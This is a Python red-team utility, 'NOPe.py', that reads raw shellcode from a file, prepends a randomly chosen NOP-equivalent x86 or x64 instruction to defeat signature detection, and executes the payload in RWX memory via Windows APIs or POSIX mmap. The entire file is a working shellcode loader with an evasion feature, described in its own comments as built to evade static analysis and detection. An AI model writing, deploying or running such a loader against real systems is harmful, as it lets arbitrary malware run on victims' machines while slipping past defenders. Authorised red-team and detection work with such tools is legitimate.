# File: NOPe.py
# Purpose: Utility to prepend a randomized NOP sled to arbitrary shellcode and execute it in memory.
# Red Team Tradecraft: Implements code obfuscation (MITRE ATT&CK T1027) and in-memory execution (T1059) to evade static analysis and detection.
import argparse
import ctypes
import mmap
import os
import platform
import random
import sys

X64_NOPS = {
    b"\x90": "NOP (single byte, standard NOP instruction)",
    b"\x66\x90": "NOP (two-byte variant, used for instruction alignment)",
    b"\x0F\x1F\x00": "NOP DWORD PTR [RAX] (three-byte NOP, Intel recommended)",
    b"\x0F\x1F\x40\x00": "NOP DWORD PTR [RAX+0] (four-byte NOP)",
    b"\x0F\x1F\x44\x00\x00": "NOP DWORD PTR [RAX+RAX*1+0] (five-byte NOP)",
    b"\x0F\x1F\x80\x00\x00\x00\x00": "NOP QWORD PTR [RAX+0] (seven-byte NOP)",
    b"\x0F\x1F\x84\x00\x00\x00\x00\x00": "NOP QWORD PTR [RAX+RAX*1+0] (eight-byte NOP)",
    b"\x66\x0F\x1F\x84\x00\x00\x00\x00\x00": "NOP (nine-byte, long variant for alignment)",
    b"\x87\xDB": "XCHG EBX, EBX (register swap, acts as a NOP)",
    b"\x87\xC9": "XCHG ECX, ECX (similar to above, avoids altering execution)",
    b"\x8D\x49\x00": "LEA ECX, [RCX+0] (no-op using LEA instruction)",
    b"\x8D\x74\x26\x00": "LEA ESI, [RSI+0] (useful for obfuscation)",
    b"\x48\x8D\x64\x24\x00": "LEA RSP, [RSP+0] (avoids register changes)",
    b"\x89\xC0": "MOV EAX, EAX (redundant move, acts as a NOP)",
    b"\x49\x89\xD1": "MOV R9, RDX (acts as NOP if R9 equals RDX)",
    b"\x50\x58": "PUSH RAX / POP RAX (stack operation without effect)",
    b"\x53\x5B": "PUSH RBX / POP RBX (may affect shadow space)",
    b"\x48\xFF\xC0\x48\xFF\xC8": "INC RAX / DEC RAX",
    b"\x83\xC0\x00": "ADD EAX, 0 (acts as a NOP)",
    b"\x83\xE8\x00": "SUB EAX, 0 (does nothing)",
    b"\x04\x00": "ADD AL, 0 (no real effect)",
    b"\x2C\x00": "SUB AL, 0 (same as above)",
    b"\x21\xC0": "AND EAX, EAX (self-AND operation)",
    b"\x83\xC8\x00": "OR EAX, 0 (logical OR with zero)",
    b"\x83\xF0\x00": "XOR EAX, 0 (only changes flags)",
    b"\x48\x87\xC0": "XCHG RAX, RAX (acts as a NOP)",
    b"\x48\x89\xC0": "MOV RAX, RAX (redundant move)",
    b"\x52\x5A": "PUSH RDX / POP RDX (another stack NOP trick)",
    b"\x48\x8D\x40\x00": "LEA RAX, [RAX] (load effective address)",
    b"\x48\x8D\x49\x00": "LEA RCX, [RCX] (acts as a NOP)",
    b"\xD9\xD0": "FNOP (floating-point NOP)",
    b"\xEB\x00": "JMP SHORT $+2 (jumps to itself)",
    b"\x75\x00": "JNZ SHORT $+2 (conditional jump NOP)",
    b"\x74\x00": "JZ SHORT $+2 (jump-based NOP)",
}
X86_NOPS = {
    b"\x90": "NOP (single byte, standard NOP instruction)",
    b"\x66\x90": "NOP (two-byte variant, used for instruction alignment)",
    b"\x0F\x1F\x00": "NOP DWORD PTR [EAX] (three-byte NOP, Intel recommended)",
    b"\x0F\x1F\x40\x00": "NOP DWORD PTR [EAX+0] (four-byte NOP)",
    b"\x0F\x1F\x44\x00\x00": "NOP DWORD PTR [EAX+EAX*1+0] (five-byte NOP)",
    b"\x87\xDB": "XCHG EBX, EBX (register swap with itself, acts as a NOP)",
    b"\x89\xF6": "MOV ESI, ESI (redundant move, acts as a NOP)",
    b"\x8D\x49\x00": "LEA ECX, [ECX+0] (load effective address, does nothing)",
    b"\x8D\x74\x26\x00": "LEA ESI, [ESI+0] (similar to above, good for obfuscation)",
    b"\x50\x58": "PUSH EAX / POP EAX (stack operation with no real effect)",
    b"\x53\x5B": "PUSH EBX / POP EBX (similar to above, acts as padding)",
    b"\xD9\xD0": "FNOP (FPU NOP, often ignored but useful for evasion)",
    b"\x89\xC0": "MOV EAX, EAX (redundant register move, acts as a NOP)",
    b"\x40\x48": "INC EAX / DEC EAX",
    b"\x83\xC0\x00": "ADD EAX, 0 (Redundant addition, does nothing)",
    b"\x83\xE8\x00": "SUB EAX, 0 (Redundant subtraction, does nothing)",
    b"\x04\x00": "ADD AL, 0 (Redundant operation on AL register)",
    b"\x2C\x00": "SUB AL, 0 (Redundant subtraction, acts as a NOP)",
    b"\x21\xC0": "AND EAX, EAX (Logical AND with itself, preserves value)",
    b"\x83\xC8\x00": "OR EAX, 0 (Logical OR with 0, no effect on value)",
    b"\x83\xF0\x00": "XOR EAX, 0 (Redundant XOR, does nothing but clears flags)",
    b"\x87\xC0": "XCHG EAX, EAX (Redundant exchange, effectively a NOP)",
    b"\x89\xDB": "MOV EBX, EBX (Same as above, another form of NOP)",
    b"\x51\x59": "PUSH ECX / POP ECX (Similar to above, used for obfuscation)",
    b"\x8D\x40\x00": "LEA EAX, [EAX] (Load effective address with no effect)",
    b"\x2E\x90": "CS: NOP (Segment override prefix, mostly ignored in modern CPUs)",
    b"\x3E\x90": "DS: NOP (Segment override, has no practical effect)",
    b"\x36\x90": "SS: NOP (Another ignored segment override)",
    b"\x26\x90": "ES: NOP (Acts as a standard NOP)",
    b"\xEB\x00": "JMP SHORT $+2 (Jumps to next instruction, wasting cycles)",
    b"\x75\x00": "JNZ SHORT $+2 (Conditional jump that has no real effect)",
    b"\x74\x00": "JZ SHORT $+2 (Another jump-based NOP, good for obfuscation)",
}

# Function: execute_shellcode
# Description: Reads raw shellcode from disk, prepends a randomized NOP variant for obfuscation,
#              allocates executable memory, and transfers execution to the modified payload.
# Red Team Tradecraft: Evades static analysis through random NOP sleds (T1027) and leverages in-memory code execution (T1059).
def execute_shellcode(shellcode_file: str, arch: str, verbose: bool = False) -> None:
    """Load and execute shellcode with a random NOP for a given architecture,
    using Windows APIs on NT and POSIX mmap/libc on other systems."""
    # Read in the raw shellcode bytes
    with open(shellcode_file, 'rb') as f:
        shellcode_bytes = f.read()

    # Pick a random prepended NOP
    nops = X64_NOPS if arch == "x64" else X86_NOPS
    nop_bytes, desc = random.choice(list(nops.items()))
    payload = nop_bytes + shellcode_bytes

    if verbose:
        print(f"[+] Platform: {platform.system()}")
        print(f"[+] Selected architecture: {arch}")
        print(f"[+] NOP used: {desc} ({nop_bytes.hex()})")
        print(f"[+] Total payload size: {len(payload)} bytes")

    system = platform.system()
    if system == "Windows":
        kernel32 = ctypes.windll.kernel32
        kernel32.VirtualAlloc.restype = ctypes.c_void_p
        kernel32.CreateThread.argtypes = (
            ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
            ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int)
        )

        # Allocate RWX memory
        alloc = kernel32.VirtualAlloc(
            None, len(payload),
            0x3000,        # MEM_COMMIT | MEM_RESERVE
            0x40           # PAGE_EXECUTE_READWRITE
        )
        if not alloc:
            raise ctypes.WinError()

        # Copy in the shellcode
        buf = (ctypes.c_char * len(payload)).from_buffer_copy(payload)
        kernel32.RtlMoveMemory(ctypes.c_void_p(alloc), buf, len(payload))

        # Execute in a new thread and wait
        thread_handle = kernel32.CreateThread(
            None, 0,
            ctypes.c_void_p(alloc),
            None, 0,
            ctypes.pointer(ctypes.c_int(0))
        )
        kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)

    else:
        # -- POSIX path via mmap + libc --
        size = len(payload)
        # mmap an anonymous RWX region
        mem = mmap.mmap(
            -1, size,
            prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
            flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS
        )
        # write the payload in
        mem.write(payload)

        # get a void* pointer to the mmap buffer
        addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))

        # on Linux/UNIX we can just cast to a function and call it
        shellfunc = ctypes.CFUNCTYPE(None)(addr)
        shellfunc()

        # cleanup (optional)
        mem.close()


# Function: list_nops
# Description: Enumerates all supported NOP instruction variants for the chosen architecture,
#              helping operators understand available obfuscation primitives.
def list_nops(arch: str) -> None:
    """List all supported NOP instructions for the selected architecture."""
    print(f"\nSupported NOP instructions for architecture: {arch.upper()}")
    nops = X64_NOPS if arch == "x64" else X86_NOPS
    for nop, desc in nops.items():
        print(f"  {nop.hex():<20} {desc}")
    print()


# Function: main
# Description: Parses command-line arguments and orchestrates script behavior for listing NOPs or executing payloads, providing a unified operator interface.
def main():
    parser = argparse.ArgumentParser(
        description="Execute shellcode with a random prepended NOP (x86 or x64).",
        epilog="Example: python3 NOPe.py -f payload.bin --arch x64"
    )
    parser.add_argument(
        "-f", "--file", default="msgbox.x64.bin",
        help="Path to shellcode file (.bin)"
    )
    parser.add_argument(
        "--arch", choices=["x86", "x64"], default="x64",
        help="Architecture of shellcode (default: x64)"
    )
    parser.add_argument(
        "--list-nops", action="store_true",
        help="List available NOP instructions for selected architecture"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose output"
    )

    args = parser.parse_args()

    if args.list_nops:
        list_nops(args.arch)
        sys.exit(0)

    if args.verbose:
        print(f"[+] Executing shellcode from: {args.file}")

    execute_shellcode(args.file, args.arch, args.verbose)


if __name__ == "__main__":
    main()
